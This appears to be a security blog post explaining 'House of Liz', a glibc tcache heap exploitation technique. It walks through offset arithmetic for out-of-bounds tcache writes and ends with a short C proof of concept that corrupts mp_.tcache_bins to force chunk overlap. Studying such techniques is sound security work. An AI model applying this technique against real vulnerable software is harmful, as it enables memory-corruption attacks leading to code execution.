---
layout: post
title:  "House of Liz"
date:   2025-11-21 09:16:42 -0500
categories: heap-exploit
---

### Introduction

*House of Liz* is a TCache-based heap exploitation technique with the following objectives:
* To write an arbitrary value on an arbitrary location on heap. 
* To write the pointer of an attacker-controlled chunk on an arbitrary location on heap.

* **Cause:** UAF/Overflow 
* **Applicable version:** >=2.30 versions of GLIBC

It has been tested on the latest version of GLIBC(`2.42`) at the time of writing this post.

Because one is capable of writing arbitrary values on heap metadata/data, this technique can open the doors to huge amount of other heap-related and program-specific techniques, like chunk overlapping, tcache poisoning, fastbin attack, jump table hijack, etc.. You can also possibly achieve a heap-leak with house of liz, by writing a tcache chunk's ptr on a part of heap that you're able to read from.

#### Prerequisites
* The ability to write a huge value on an arbitrary location
* Libc leak
* Being able to malloc/free with sizes higher than TCache maximum chunk size (0x408)

The first one can be achieved by techniques like largebin attack, house of mind (fastbin), or any program-specific form of arbitrary address writing. 

#### Summary
The core concept of "House of Liz" is around the fact that when it comes to recording a tcache chunk in `tcache_perthread_struct`, TCache mechanism does not enforce any form of restriction on the value of `mp_.tcache_bins/mp_.tcache_max_bytes`, or WHERE the tcachebin count and head ptr are going to be written. This means if we're somehow able to write a huge value on one of the fields of `mp_` (which resides in libc), by requesting a chunk size higher than TCache range, we can control the PLACE that a **tcachebin pointer** and **counter** is going to be written. Considering the fact that a `tcache_perthread_struct` is normally placed on heap, one can perform a *TCache relative write* on an arbitrary point located after the tcache metadata chunk. By writing the new freed tcache chunk's pointer, we can combine this technique with other techniques like tcache poisoning and table hijacking. By writing the new counter, we can write arbitrary value on an arbitrary location, with the right amount of mallocs and frees. With all these combined, one is able to create impactful chains of exploits, using this technique as their foundation.       

### Brief review of `tcache_perthread_struct` management
For each thread that has invoked `__libc_malloc` there exists a heap-allocated structure which is responsible for tracking two main variables for each tcache bin: The counter (Current number of chunks in the tcachebin) and the tcache bin head pointer. Here's its [structure][tcache_perthread_struct]:
{% highlight C %}
typedef struct tcache_perthread_struct
{
  uint16_t num_slots[TCACHE_MAX_BINS];      // The counters list
  tcache_entry *entries[TCACHE_MAX_BINS];   // tcachebins pointers
} tcache_perthread_struct;
{% endhighlight %}

Assuming that `TCACHE_MAX_BINS` equals to 64, we have 128 bytes reserved for `num_slots` and 512 bytes for `entries`, making up a structure of 0x280 in size. So if this structure gets allocated on the heap, this is what it would look like if you used the `heap` command on pwndbg:
{% highlight bash %}
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x290 (with flag bits: 0x291)
{% endhighlight %}
 
Because tcache bins are managed in a LIFO manner, the head of a tcache bin always points to the most recently inserted chunk. So assuming we already have two chunks A and B of size 0x20, inserted respectively into tcache[0], and another 0x20 chunk (C) is inserted, this is a simplified representation of how it would look like: 
{% highlight C %}
// Before: 
num_slots[0] = 2

    tcache_entries[0]
       |
       V
       B -----(B->fd = &A->fd)---------> A (A->fd = NULL)

// After:
num_slots[0] = 3

    tcache_entries[0]
       |
       V
       C -----(C->fd = &B->fd)--------> B -----(B->fd = &A->fd)---------> A (A->fd = NULL)

{% endhighlight %}

Here's the code for `tcache_put` (`tcache_put_n` in GLIBC `>=2.42`):
{% highlight C %}
/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);

  ...

  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
{% endhighlight %}
As we can see in the comment, it is caller's responsibility to ensure `tc_idx`'s validity. There are multiple scenarios that can lead to `tcache_put` call, but in our case we're just interested in how [`tcache_free`][tcache_free] calls it. So lets see how the caller actually handles `tc_idx`:
{% highlight C %}
static inline bool
tcache_free (mchunkptr p, INTERNAL_SIZE_T size)
{
  bool done = false;
  size_t tc_idx = csize2tidx (size);
  if (tcache != NULL && tc_idx < mp_.tcache_bins)
    {
      /* Check to see if it's already in the tcache.  */
      tcache_entry *e = (tcache_entry *) chunk2mem (p);

      /* This test succeeds on double free.  However, we don't 100%
	 trust it (it also matches random payload data at a 1 in
	 2^<size_t> chance), so verify it's not an unlikely
	 coincidence before aborting.  */
      if (__glibc_unlikely (e->key == tcache_key))
	tcache_double_free_verify (e, tc_idx);

      if (tcache->counts[tc_idx] < mp_.tcache_count)
	{
	  tcache_put (p, tc_idx);
	  done = true;
	}
    }
  return done;
} 
{% endhighlight %}
To calculate the corresponding tcache index (`tc_idx`) for a new freeing chunk, `tcache_free` uses the macro [`csize2tidx`][csize2tidx], which has the following defenition:

{% highlight C %}
# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)
{% endhighlight %}
Basically, `csize2tidx` computes the appropriate tcache index for a chunk **based on the requested size**. This index is then used by `tcache_pue` to update `tcache_perthread_struct.entries` and `tcache_perthread_struct.num_slots`. In `tcache_free`, **the only check on `tc_idx` is its comparison with `mp_.tcache_bins`.**  

### What is wrong here?
The main problem here is that although `tcache_perthread_struct`'s fields are allocated and managed statically (since `TCACHE_MAX_BINS` is a constant), GLIBC's validation of `tc_idx` fails to account for this. `mp_.tcache_bins` alone as a dynamic should not be treated as a reliable indicator of whether a `tc_idx` is valid. If one is able to change `mp_.tcache_bins` -- for example by overwriting it with a value larger than 64 --, he can craft a large `tc_idx`, pass the `tc_idx < mp_.tcache_bins` check, and trigger an out-of-bounds relative write into heap and potentially libc.


So this was the easy part. The main question now is how we can actually control **WHERE** and **WHAT** value `tcache_put` is going to write? The relative write technique to write an attacker-controlled chunk ptr out-of-bounds is not something new, and has been used on fastbins in techniques like *House of Roman* and *House of Husk*. What makes House of Liz interesting is not just the fact that the mentioned goal can be achieved on TCache, but that it also gives an attacker the ability to choose WHAT to write (due to the associated counter variable). Although the only thing done with the counter variable is a single increment, an attacker can still achieve arbitrary value write, with the right amount of mallocs and frees.   

The rest of this post is focused on how we can use this poor indexing for our advantage. To create useful exploit chains, we have to be precise. So lets first do some basic math. 

### TCache relative write
The idea is to craft a precise `tc_idx` such that, when it is used by `tcache_put`, the resulting write of tcachebin pointer and its counter occurs beyond the bounds of `tcache_perthread_struct` and into our target location. This is done by requesting a chunk with the right amount of size and then freeing it. To compute the right size, we have to consider `csize2tidx` and the pointer arithmetic within `tcache_put` when it comes to indexing.    

If we let `nb` be the internal form of the freeing chunk size, `MALLOC_ALIGNMENT=0x10`, and `MINSIZE=0x20`:
```
tc_index = (nb - 0x20 + 0x10 -1) / 0x10 = (nb - 0x11) / 0x10
```
Because `tc_index` is an integer:
```
tc_index = (nb-16)/16 - 1
```
So if `nb = 0x20` (least chunk size), then `tc_index = 0`, if `nb = 0x30`, then `tc_index = 1`, and so on.

With some knowledge of C pointer arithmetic, we can predict the location of the tcachebin pointer & counter write, just by having `nb` on our hands:
```
// Here `tcache` is just symbol for a pointer to the heap-allocated `tcache_perthread_struct` 
unsigned long *ptr_write_loc = (void*)(&tcache->entries) + 8*tc_index = (void*)(&tcache->entries) + (nb-16)/2 - 8
unsigned long *counter_write_loc = (void*)(&tcache->counts) + 2*tc_index = (void*)(&tcache->counts) + (nb-16)/8 - 2
```
In other words: 
* `Our_preferred_ptr_location = tcache_entries location + (nb-16)/2 - 8`
* `Our_preferred_counter_location = tcache_counts location + (nb-16)/8 - 2`

You might think that to compute `nb`, you need two pointer address, thus a heap leak. That is not true. You just have to compute the difference (delta) between fields of `tcache_perthread_struct` and your target location, which does not require a heap leak and can be easily done by a debugger. 

For example, if the tcache structure is allocated at `0x555555559000`, and you want to overwrite a half-word (`++counts[tc_index]`) at `0x5555555596b8`, delta would be:
```
delta = 0x5555555596b8 - (&tcache->counts) = 0x5555555596b8 - 0x555555559010 = 0x6a8
```  
Even if ASLR is on, the delta would always be `0x6a8`. So no heap-leak is required. 

Now to calculate nb for a count write:
```
delta = 0x6a8 = (nb-16)/8 - 2 --> nb = (0x6aa*8) + 16 = 0x3560 
```
So if we request a chunk of size `0x3550` and then free it, `counts[tc_index]` would be equal to `*0x5555555596b8`, thus by the count increment we actually increment whatever that is stored in `0x5555555596b8`.
Now assuming you want to write the freed chunk pointer's address at `0x5555555596c0`:
```
delta = 0x5555555596c0 - (&tcache->entries) = 0x5555555596c0 - 0x555555559090 = 0x630
(nb-16)/2 - 8 = 0x630 --> nb = 0xc80
```

Now to show how powerful these two types of writes can be, lets first trigger a chunk overlap with `counter` write, and then write the attacker controlled chunk pointer to trigger tcache poisoning. 

### PoC

{% highlight C %}
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main(void)
{
    setbuf(stdout, NULL);

    unsigned long *p1 = malloc(0x410);
    unsigned long *p2 = malloc(0x100);

    free(p1);

    /*VULNERABILITY*/
    
    // Largebin attack (Works on latest versions), Unsortedbin attack (<2.29) and 
    // any other heap-related or program-specific technique used to write  a huge 
    // value on arbitrary location.

    unsigned long *mp_tcache_bins = (void*)p1[0] - 0x938;   // Relative computation of &mp_.tcache_bins
    *mp_tcache_bins = 0x7fffffffffff;

    /*VULNERABILITY*/

    // Trigger chunk overlap

    unsigned long *p = malloc(0x3560);
    free(p);
    free(p2);

    p = malloc(0x10100);

    assert(p == p2);

    p = malloc(0xc70); 
    free(p);

    assert(*p2 == p);

    // tcache poisoning ...
}

{% endhighlight %}

[tcache_perthread_struct]: https://elixir.bootlin.com/glibc/glibc-2.42/source/malloc/malloc.c#L3127
[tcache_free]: https://elixir.bootlin.com/glibc/glibc-2.41/source/malloc/malloc.c#L3249
[csize2tidx]: https://elixir.bootlin.com/glibc/glibc-2.41/source/malloc/malloc.c#L301
